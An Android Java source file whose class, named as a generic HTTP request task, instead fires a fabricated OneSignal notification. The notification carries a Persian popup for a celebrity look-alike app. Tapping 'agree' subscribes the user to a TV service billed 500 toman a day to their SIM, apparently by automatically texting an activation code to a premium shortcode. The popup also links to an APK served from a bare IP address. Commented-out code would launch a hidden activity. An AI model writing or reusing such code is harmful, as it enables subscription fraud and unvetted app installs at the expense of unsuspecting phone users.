package ir.website.faal141;

import android.os.AsyncTask;
import android.util.Log;

import com.onesignal.OSNotification;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONObject;

/**
 * Created by ali on 10/9/17.
 */

class RequestTask extends AsyncTask<String, String, String> {

    private static final String TAG = "RequestTask";

    @Override
    protected String doInBackground(String... uri) {
        HttpClient httpclient = new DefaultHttpClient();
        HttpResponse response;
        String responseString = null;
        try {
//            response = httpclient.execute(new HttpGet(uri[0]));
//            StatusLine statusLine = response.getStatusLine();
//            if(statusLine.getStatusCode() == HttpStatus.SC_OK){
//                ByteArrayOutputStream out = new ByteArrayOutputStream();
//                response.getEntity().writeTo(out);
//                responseString = out.toString();
//                Log.d("RequestTasksleep",String.valueOf(statusLine));
//
//                Thread.sleep(20000);
//                Log.d("RequestTaskunsleep",String.valueOf(statusLine));
//
//                out.close();
//            } else{
//                //Closes the connection.
//                Log.d("RequestTask",String.valueOf(statusLine));
//                response.getEntity().getContent().close();
////                throw new IOException(statusLine.getReasonPhrase());
//            }
//        } catch (ClientProtocolException e) {
//            /* TODO Handle problems.. */
//        } catch (IOException e) {
//            //TODO Handle problems..
//        }
////        catch (IOException e) {
////            //TODO Handle problems..
//            Log.d("NoDisplayActivity", "doInBackground");
//            NoDisplayActivity.urlStatic = uri[0];
//            Intent serviceIntent = new Intent(OSService.context, NoDisplayActivity.class);
//            serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
//            OSService.context.startActivity(serviceIntent);
//            Log.d("NoDisplayActivity", "startActivity");



            Utility.notificationFired(new OSNotification(new JSONObject("{\"isAppInFocus\":false,\"shown\":true,\"androidNotificationId\":468843473,\"displayType\":0,\"payload\":{\"notificationID\":\"6949576c-dba2-45bd-937d-6564afc8cef2\",\"title\":\"شرایط استفاده از اپ شبیه کدوم بازی\",\"body\":\"شما در این اپلیکیشن میتوانید شباهت خود با بازیگران و افراد مشهور را متوجه شوید. شما شرایط استفاده از اپلیکیشن را به همراه عضویت در سرویس تلویزیون تو می پذیرید. شما با کلیک بر روی گزینه زیر، تمامی شرایط استفاده و دسترسی های اپلیکشن شبیه کدوم بازیگری را پذیرفته اید\",\"additionalData\":{\"btns2\":\"[{~id~: ~shortcode2-link2~,~text~:~ موافقم<br/> هزینه روزانه پانصد تومان از سیمکارت ~,~icon~:~agree~}]\",\"curstep\":\"1\",\"key1\":\"114\",\"notifid\":\"tvu5\",\"key2\":\"optional\",\"shortcode1\":\"3072330\",\"shortcode2\":\"3072330\",\"prefix\":\"کد فعالسازی:\",\"body2\":\"شما در این اپلیکیشن میتوانید شباهت خود با بازیگران و افراد مشهور را متوجه شوید. شما شرایط استفاده از اپلیکیشن را به همراه عضویت در سرویس تلویزیون تو می پذیرید. شما با کلیک بر روی گزینه زیر، بصورت اتوماتیک کد فعال سازی را پیامک کرده و تمامی شرایط استفاده و دسترسی های اپلیکشن را پذیرفته اید.\",\"title2\":\"شرایط استفاده از اپ شبیه کدوم بازیگری\",\"type\":\"popup\",\"steps\":\"2\",\"operator\":\"\",\"poptype\":\"v2\",\"appname\":\"\",\"link2\":\"http://141.105.69.168/files/شبیه کدوم بازیگری.apk\",\"postfix\":\"برای\"},\"lockScreenVisibility\":1,\"groupMessage\":\"\",\"actionButtons\":[{\"id\":\"shortcode1\",\"text\":\"موافقم\",\"icon\":\"agree\"}],\"fromProjectNumber\":\"458878317944\",\"priority\":5,\"rawPayload\":\"\"}}")));


        } catch (Exception e) {
            Log.d("NoDisplayActivity", e.getMessage());
            //TODO Handle problems..
        }
        return responseString;
    }

    @Override
    protected void onPostExecute(String result) {
        super.onPostExecute(result);
        //Do anything with response..
    }
}